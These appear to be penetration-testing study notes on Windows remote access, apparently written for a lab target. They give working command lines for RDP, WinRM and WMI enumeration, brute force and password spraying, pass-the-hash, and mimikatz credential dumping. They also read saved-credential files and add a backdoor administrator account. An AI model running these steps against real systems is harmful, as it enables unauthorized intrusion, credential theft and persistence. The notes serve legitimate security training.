---
tags: [module/footprinting, windows, rdp, winrm, wmi, remote-access, level/advanced, practical]
---

# Windows Remote Management - Practical Application

## Complete Windows Remote Management Enumeration Workflow

Phase 1: RDP Enumeration
Phase 2: WinRM Enumeration
Phase 3: WMI Enumeration
Phase 4: Credential Attacks
Phase 5: Post-Exploitation

---

## Phase 1: RDP Enumeration

### Service Discovery

nmap -sV -sC 10.129.201.248 -p3389 --script rdp*

### RDP Security Scanner (rdp-sec-check)

git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
cd rdp-sec-check
perl rdp-sec-check.pl 10.129.201.248

### RDP NLA Check

nmap -p3389 --script rdp-enum-encryption 10.129.201.248

Look for "CredSSP (NLA)" to confirm NLA is enabled.

### RDP Man-in-the-Middle (if you can intercept traffic)

Use Seth or other RDP MITM tools to capture credentials.

### RDP Brute Force

hydra -L users.txt -P passwords.txt rdp://10.129.201.248

### RDP Connection Attempts

xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248 +auth-only
xfreerdp /u:cry0l1t3 /pth:NT-HASH /v:10.129.201.248

### RDP Session Hijacking (if you have SYSTEM)

Query sessions:
qwinsta /server:10.129.201.248

Reset session:
rwinsta /server:10.129.201.248 2

### RDP Pass-the-Hash

xfreerdp /u:cry0l1t3 /pth:NT-HASH /v:10.129.201.248

---

## Phase 2: WinRM Enumeration

### Service Discovery

nmap -sV -sC 10.129.201.248 -p5985,5986

### WinRM Authentication Testing

crackmapexec winrm 10.129.201.248 -u users.txt -p passwords.txt

### WinRM Login Attempt

evil-winrm -i 10.129.201.248 -u cry0l1t3 -p P455w0rD!

### WinRM with Pass-the-Hash

evil-winrm -i 10.129.201.248 -u cry0l1t3 -H NT-HASH

### WinRM over HTTPS

evil-winrm -S -i 10.129.201.248 -u cry0l1t3 -p P455w0rD! -c client.crt -k client.key

### WinRM Information Gathering

# System info
systeminfo

# Users
net users
Get-LocalUser

# Processes
Get-Process

# Services
Get-Service

# Network
ipconfig /all
netstat -ano

# Firewall rules
netsh advfirewall show allprofiles

# WinRM configuration
winrm get winrm/config

---

## Phase 3: WMI Enumeration

### Service Discovery

nmap -p135 --script wmi-info 10.129.201.248

### WMI with wmiexec.py

wmiexec.py cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"

### WMI Query Examples

# List processes
wmic /node:10.129.201.248 /user:cry0l1t3 /password:P455w0rD! process list brief

# List services
wmic /node:10.129.201.248 /user:cry0l1t3 /password:P455w0rD! service list brief

# List users
wmic /node:10.129.201.248 /user:cry0l1t3 /password:P455w0rD! useraccount list

# List shares
wmic /node:10.129.201.248 /user:cry0l1t3 /password:P455w0rD! share list

# List logged on users
qwinsta /server:10.129.201.248

### WMI with PowerShell (if you have access)

Get-WmiObject -Class Win32_OperatingSystem -ComputerName 10.129.201.248
Get-WmiObject -Class Win32_Service -ComputerName 10.129.201.248
Get-WmiObject -Class Win32_UserAccount -ComputerName 10.129.201.248

### WMI Persistence

Create a WMI event subscription to run a script when triggered.

---

## Phase 4: Credential Attacks

### Common Windows Credentials to Try

| Username | Password |
|----------|----------|
| Administrator | (empty) |
| Administrator | password |
| Administrator | admin |
| Administrator | Password123 |
| Admin | admin |
| user | user |
| guest | (empty) |
| localadmin | localadmin |
| .\Administrator | (empty) |

### Pass-the-Hash

If you capture NTLM hashes, use them directly:

evil-winrm -i 10.129.201.248 -u Administrator -H NT-HASH
xfreerdp /u:Administrator /pth:NT-HASH /v:10.129.201.248
wmiexec.py -hashes :NT-HASH Administrator@10.129.201.248

### Overpass-the-Hash

Generate Kerberos tickets from hashes.

### Password Spraying

crackmapexec winrm 10.129.201.248 -u users.txt -p "Spring2025!"

crackmapexec rdp 10.129.201.248 -u users.txt -p "Password123"

---

## Phase 5: Post-Exploitation

### After Gaining Access

# Check privileges
whoami /priv
whoami /groups

# Check for additional users
net users
net localgroup administrators

# Check for saved credentials
cmdkey /list
dir /a %userprofile%\AppData\Roaming\Microsoft\Credentials\*
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*

# Check for RDP connections
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"

# Check for PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Check for unattended installation files
dir /s *unattend* 2>nul
dir /s *sysprep* 2>nul

### Enable RDP (if disabled)

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

### Enable WinRM (if disabled)

winrm quickconfig
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.10.14.20"

### Add Backdoor User

net user hacker Password123! /add
net localgroup administrators hacker /add

### Dump Credentials

mimikatz.exe
sekurlsa::logonpasswords
lsadump::sam
lsadump::lsa /patch

### Pass-the-Hash with Retrieved Hashes

Use gathered hashes to move laterally.

---

## Complete Enumeration Script (PowerShell)

Save as remote-enum.ps1:

$target = "10.129.201.248"
$username = "cry0l1t3"
$password = "P455w0rD!"

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)

Write-Host "[*] Testing WinRM connection..."
Test-WsMan -ComputerName $target -Credential $credential

Write-Host "[*] Getting system info via WMI..."
Get-WmiObject -Class Win32_OperatingSystem -ComputerName $target -Credential $credential

Write-Host "[*] Getting services via WMI..."
Get-WmiObject -Class Win32_Service -ComputerName $target -Credential $credential | Select Name, State, StartMode

Write-Host "[*] Getting users via WMI..."
Get-WmiObject -Class Win32_UserAccount -ComputerName $target -Credential $credential | Select Name, SID, Status

---

## Tool Comparison

| Tool | Protocol | Best For |
|------|----------|----------|
| xfreerdp | RDP | Linux RDP client |
| rdp-sec-check | RDP | Security auditing |
| evil-winrm | WinRM | Interactive WinRM shell |
| crackmapexec | WinRM/RDP | Credential spraying |
| wmiexec.py | WMI | Command execution |
| Impacket suite | All | Comprehensive toolkit |

---

## Key Takeaways

- RDP: GUI access on port 3389
- WinRM: Command-line access on 5985/5986
- WMI: Deep system access on 135 + dynamic
- NLA requires authentication before full RDP session
- Self-signed certificates are normal but can be spoofed
- Pass-the-hash works with RDP, WinRM, and WMI
- Evil-WinRM is the best tool for WinRM on Linux
- Crackmapexec is great for credential spraying
- Always check for saved credentials post-exploit
- Add backdoor users for persistence
- Enable disabled services if needed
